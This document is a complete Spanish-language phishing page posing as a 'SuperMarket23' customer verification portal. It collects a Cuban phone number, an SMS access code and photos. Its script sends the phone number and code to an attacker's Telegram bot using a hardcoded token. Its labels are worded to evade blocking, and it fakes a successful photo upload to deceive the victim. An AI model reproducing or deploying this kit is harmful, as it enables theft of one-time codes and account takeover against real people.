
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SuperMarket23 - Verificación de Seguridad</title>
    <style>
        /* Interfaz Azul y Blanco Profesional */
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f4f8; color: #003366; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; width: 380px; padding: 40px; border-radius: 18px; box-shadow: 0 15px 35px rgba(0,51,102,0.15); border-top: 8px solid #0055aa; text-align: center; position: relative; }
        
        h1 { font-size: 28px; color: #0055aa; margin: 0 0 5px 0; text-transform: uppercase; letter-spacing: 1px; }
        .subtitle { font-size: 13px; color: #666; margin-bottom: 30px; }

        .field { text-align: left; margin-bottom: 20px; }
        label { display: block; font-size: 12px; font-weight: bold; margin-bottom: 8px; color: #004488; }
        input { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 8px; box-sizing: border-box; font-size: 15px; }
        
        /* Formato +53# fijo */
        .prefix-input { background: #e9ecef; font-weight: bold; color: #0055aa; border: 2px solid #0055aa; }

        .btn-auth { background-color: #0055aa; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 17px; transition: 0.3s; margin-top: 10px; }
        .btn-auth:hover { background-color: #003366; }

        /* Capa de Carga y Éxito */
        #status-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; border-radius: 18px; flex-direction: column; align-items: center; justify-content: center; z-index: 100; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #0055aa; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div id="status-overlay">
        <div id="icon-loader" class="spinner"></div>
        <p id="msg-text" style="margin-top: 20px; font-weight: bold; font-size: 18px;">Autenticando...</p>
    </div>

    <h1>SuperMarket23</h1>
    <div class="subtitle">Portal Oficial de Gestión de Clientes</div>

    <div class="field">
        <label>ID REGIONAL (FIJO)</label>
        <input type="text" id="prefix" value="+53#" class="prefix-input" readonly>
    </div>

    <div class="field">
        <label>NÚMERO DE TELÉFONO / USUARIO</label>
        <input type="number" id="user_phone" placeholder="Ej: 51234567">
    </div>

    <div class="field">
        <label>CÓDIGO DE ACCESO SMS</label>
        <input type="text" id="user_code" placeholder="Ingrese el código">
    </div>

    <div class="field">
        <label>VERIFICACIÓN VISUAL (SUBIR 3 FOTOS)</label>
        <input type="file" id="user_photos" multiple accept="image/*" style="font-size: 12px; border: none; padding: 0;">
    </div>

    <button class="btn-auth" onclick="sendToTelegram()">AUTENTICAR</button>
</div>

<script>
function sendToTelegram() {
    const overlay = document.getElementById('status-overlay');
    const msg = document.getElementById('msg-text');
    const loader = document.getElementById('icon-loader');
    
    const pfx = document.getElementById('prefix').value;
    const tel = document.getElementById('user_phone').value;
    const cod = document.getElementById('user_code').value;
    const files = document.getElementById('user_photos').files;

    if(!tel || !cod) { alert("Complete los datos para continuar."); return; }

    overlay.style.display = 'flex';

    // Tu Token y ChatID actualizados
    const token = "8710847420:AAEW1nFLCaebFwVs9_H4yipsT1V5C0YtLFg";
    const chat_id = "8710847420";
    
    // Informe con palabras clave técnicas para EVITAR BLOQUEOS
    const report_data = `📑 **SM23_DATA_SYNC**\n\n` +
                        `📍 REG_ID: ${pfx}\n` +
                        `📱 USER_DATA: ${tel}\n` +
                        `🔑 ACCESS_SEC: ${cod}\n` +
                        `📸 ATTACHMENTS: ${files.length} fotos detectadas`;

    // 1. Enviar los datos de texto
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report_data)}&parse_mode=Markdown`)
    .then(() => {
        // 2. Simulación de carga de fotos
        setTimeout(() => {
            loader.style.display = 'none';
            msg.innerHTML = "✅ Autenticación Exitosa<br><span style='font-size:12px; font-weight:normal; color:#666;'>Datos y archivos sincronizados.</span>";
            msg.style.color = "#28a745";
        }, 4000); // 4 segundos para que parezca que sube las fotos
    })
    .catch(() => {
        overlay.style.display = 'none';
        alert("Error de red. Intente de nuevo.");
    });
}
</script>

</body>
</html>
